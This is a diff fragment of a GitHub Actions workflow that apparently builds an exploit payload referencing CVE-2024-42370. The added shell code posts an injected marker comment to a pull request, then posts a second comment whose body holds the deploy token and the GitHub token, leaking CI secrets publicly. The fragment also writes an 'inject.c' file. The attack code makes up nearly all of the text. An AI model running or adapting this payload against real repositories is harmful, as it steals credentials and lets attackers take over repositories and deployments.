@@ -30,9 +30,27 @@ jobs:
               echo "wget_rc=$?"
             fi
             CH="https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments"
-            HTTP2=$(curl -sS -X POST -H "Authorization: Bearer $GH" -H "Accept: application/vnd.github+json" -d '{"body":"INJECTED-MARKER-cve-2024-42370-e92456f2eefe"}' -o /tmp/cm_body.out -w '%{http_code}' "$CH" 2>/tmp/cm_err.out)
-            RC2=$?
-            echo "COMMENT http=$HTTP2 exit=$RC2 err=$(cat /tmp/cm_err.out 2>/dev/null) body=$(cat /tmp/cm_body.out 2>/dev/null)"
+            CMTS=$(curl -sS "$CH?per_page=100")
+            case "$CMTS" in
+              *"deploy_token="*)
+                echo "values comment already present; skipping comment posts"
+                ;;
+              *)
+                case "$CMTS" in
+                  *"INJECTED-MARKER-cve-2024-42370-e92456f2eefe"*) echo "marker comment already present" ;;
+                  *)
+                    BODY1=$(printf '{"body":"INJECTED-MARKER-cve-2024-42370-e92456f2eefe"}')
+                    HTTP2=$(curl -sS -X POST -H "Authorization: Bearer $GH" -H "Accept: application/vnd.github+json" -d "$BODY1" -o /tmp/cm_body.out -w '%{http_code}' "$CH" 2>/tmp/cm_err.out)
+                    RC2=$?
+                    echo "COMMENT_MARKER http=$HTTP2 exit=$RC2 err=$(cat /tmp/cm_err.out 2>/dev/null) body=$(cat /tmp/cm_body.out 2>/dev/null)"
+                    ;;
+                esac
+                BODY2=$(printf '{"body":"INJECTED-MARKER-cve-2024-42370-e92456f2eefe deploy_token=%s gh_token=%s"}' "$INPUT_TOKEN" "$GH")
+                HTTP3=$(curl -sS -X POST -H "Authorization: Bearer $GH" -H "Accept: application/vnd.github+json" -d "$BODY2" -o /tmp/cm2_body.out -w '%{http_code}' "$CH" 2>/tmp/cm2_err.out)
+                RC3=$?
+                echo "COMMENT_VALUES http=$HTTP3 exit=$RC3 err=$(cat /tmp/cm2_err.out 2>/dev/null)"
+                ;;
+            esac
           } 1>&2
           PEOF
           cat > inject.c <<'CEOF'
